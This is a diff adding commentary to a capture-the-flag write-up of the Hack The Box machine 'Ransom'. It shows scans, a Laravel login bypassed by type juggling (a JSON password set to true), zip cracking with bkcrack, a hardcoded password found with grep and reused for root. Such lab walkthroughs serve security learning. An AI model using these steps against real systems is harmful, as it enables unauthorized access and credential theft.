@@ -1,3 +1,12 @@
+
+
+### Tools:
+
+### Vulnerabilities: 
+
+You know what shows a webpage and SSH as per usual.
+
+```console
 └─$ nmap -A -p- -T4 -Pn 10.129.227.93
 Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-20 14:39 CDT
 Nmap scan report for ransom.htb (10.129.227.93)
@@ -17,9 +26,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 18.44 seconds
+```
 
+Interestingly feroxbuster returned the user.txt flag and I was able to read and cat the flag in under 5 min. However I do not think this is correct so I will not post it here.
 
+The /register page also has alot of info and where I spent most of my time. This however turned out to be a rabbit hole.
 
+```console
 └─$ feroxbuster -u http://10.129.227.93 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q
 302      GET       12l       22w      350c http://10.129.227.93/ => http://10.129.227.93/login
 200      GET      172l      372w     6106c http://10.129.227.93/login
@@ -37,8 +50,14 @@ Nmap done: 1 IP address (1 host up) scanned in 18.44 seconds
 403      GET        9l       28w      278c http://10.129.227.93/css/.html
 302      GET       12l       22w      390c http://10.129.227.93/index.php => http://10.129.227.93/index.php/login
 301      GET        9l       28w      314c http://10.129.227.93/fonts => http://10.129.227.93/fonts/
+```
+The main page is a login. Simple enough but most of my tricks did not work.
 
 
+
+
+
+This is the output in Burpsuite. The password field was interesting to me and I wondered if I could mess with it.
 
 ```
 GET /api/login?password=admin HTTP/1.1
@@ -53,11 +72,39 @@ Referer: http://10.129.227.93/login
 Cookie: XSRF-TOKEN=eyJpdiI6InRjalA1Vk0wMEpXSk16WFNoMXlvaFE9PSIsInZhbHVlIjoiKytEeUdiSHd2WFpaWk9EU000ZkpCZGs4MWx6eXlROExSNDhZSGRvc01mZlY2QUZSN0o3MmNYTjlmWmJUTCtiYk94M1Y2cHdkSlNRYkordGRGMTg3K3NMZGF5QXByU0FsN1dWclA5L1NLTlYrdXRjQWRsblp5UEswZVFVUlR0RDUiLCJtYWMiOiJlYzhlOTIxNjU0OTY0MTU1YTRlMjA0OWRlZGY4Njg2ZmNjNzc0ZTZhMDM5ODhkNjUwNWRiODM2YmU4MjFkOGMyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkFsUkJrQ3krck0wNHFDeFVHcTJOUlE9PSIsInZhbHVlIjoiVGk0ZW9oMXowNFkvL2lEbWxCeHFtR1FGMk5tdXVSa2R5QW01K0VHckpaMjlhRUtwRHhSZ3VLQzhNMUdzaWtUdHViRVBuQnlCdmY0RERqSXIvUVhMNVRsMW9JL1RBR3dCZFV3SDBFRlVyWHEyTVA4NmxUTjFIaWFYaG16aHMvcy8iLCJtYWMiOiJjY2ZhOWI1MTE3NzRiNDdiZTNhYzEyZjBlZjYwOTg3ZjE5NzAxMmJmMjQ5YzczMmMzZmYyNDA5ZTk5OTY4NDhmIiwidGFnIjoiIn0%3D
 ```
 
-Type Juggling
 
+By keeping the password field blank I get a different response than normal in JSON.
 
+```
+GET /api/login?password= HTTP/1.1
+Host: 10.129.227.93
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: http://10.129.227.93/login
+Cookie: XSRF-TOKEN=eyJpdiI6InRjalA1Vk0wMEpXSk16WFNoMXlvaFE9PSIsInZhbHVlIjoiKytEeUdiSHd2WFpaWk9EU000ZkpCZGs4MWx6eXlROExSNDhZSGRvc01mZlY2QUZSN0o3MmNYTjlmWmJUTCtiYk94M1Y2cHdkSlNRYkordGRGMTg3K3NMZGF5QXByU0FsN1dWclA5L1NLTlYrdXRjQWRsblp5UEswZVFVUlR0RDUiLCJtYWMiOiJlYzhlOTIxNjU0OTY0MTU1YTRlMjA0OWRlZGY4Njg2ZmNjNzc0ZTZhMDM5ODhkNjUwNWRiODM2YmU4MjFkOGMyIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkFsUkJrQ3krck0wNHFDeFVHcTJOUlE9PSIsInZhbHVlIjoiVGk0ZW9oMXowNFkvL2lEbWxCeHFtR1FGMk5tdXVSa2R5QW01K0VHckpaMjlhRUtwRHhSZ3VLQzhNMUdzaWtUdHViRVBuQnlCdmY0RERqSXIvUVhMNVRsMW9JL1RBR3dCZFV3SDBFRlVyWHEyTVA4NmxUTjFIaWFYaG16aHMvcy8iLCJtYWMiOiJjY2ZhOWI1MTE3NzRiNDdiZTNhYzEyZjBlZjYwOTg3ZjE5NzAxMmJmMjQ5YzczMmMzZmYyNDA5ZTk5OTY4NDhmIiwidGFnIjoiIn0%3D
+Content-Length: 2
+```
+```
+HTTP/1.1 422 Unprocessable Content
+Date: Thu, 20 Oct 2022 21:42:43 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Cache-Control: no-cache, private
+X-RateLimit-Limit: 60
+X-RateLimit-Remaining: 57
+Access-Control-Allow-Origin: *
+Set-Cookie: laravel_session=eyJpdiI6IndUSXBJUFhEVjNxUnJPRW5vQStVU1E9PSIsInZhbHVlIjoicGg2bHNHZFMyUjNUM0dZNjhlenZJVlBGSW9vZkVPWWRiK3BEZ3lvOVk0bFo1cUZEcnhUY2kvVjhEWkpxU2NFc01ieURZNVhycFFTYnJKTm40SnREQUhoaUxLMFJQaEUrbXMvMjVNVmx4N1hWZEhBZ2VndDFKUzBTd3VrMnFia3ciLCJtYWMiOiI5MDBmZWE2ZDZmODJlZmMyNjY4ZjY4MzQ4YzMyNWU5NDk2Y2Y0ZDY0NGUzNGI2N2JkMGQ3ZTg1MTBiNWQ2OWJhIiwidGFnIjoiIn0%3D; expires=Thu, 20-Oct-2022 23:42:43 GMT; Max-Age=7200; path=/; samesite=lax
+Content-Length: 99
+Connection: close
+Content-Type: application/json
 
+{"message":"The given data was invalid.","errors":{"password":["The password field is required."]}}
+```
 
+Pretty simply all we have to do is create a new password field in JSON and set it to true. AKA Type Juggling
 
 ```
 GET /api/login HTTP/1.1
@@ -92,6 +139,15 @@ Content-Type: text/html; charset=UTF-8
 
 Login Successful
 ```
+
+After confirming the successful login capture a fresh request in Burp and input the same data then forward to reach the next page.
+
+
+
+
+
+
+
 
 ```console
 └─$ ./bkcrack -L uploaded-file-3422.zip 
@@ -220,11 +276,25 @@ To check for new updates run: sudo apt update
 Last login: Mon Jul  5 11:34:49 2021
 htb@ransom:~$ 
 ```
+I noticed a .git file and I was intrigued however since there were so many files in this directory I decided to try and find a password first.
 
-╔══════════╣ Checking Pkexec policy
-╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                     
-                                                                                                                               
-[Configuration]
-AdminIdentities=unix-user:0
-[Configuration]
-AdminIdentities=unix-group:sudo;unix-group:admin
+Alot of information showed up but one of them stood out as a possible password. ```UHC-March-Global-PW!```
+
+```console
+htb@ransom:/srv/prod$ grep -r "password"
+
+app/Http/Controllers/AuthController.php:        if ($request->get('password') == "UHC-March-Global-PW!")
+```
+
+
+I was hoping to gain sudo permissions with this password so I could possible abuse pkexec but what I got was even better. Root's own password!
+
+```
+htb@ransom:/srv/prod$ su root
+Password:
+root@ransom:/srv/prod# cat /home/htb/user.txt
+db28****************************
+root@ransom:/srv/prod# cat /root/root.txt
+58b0****************************
+
+```
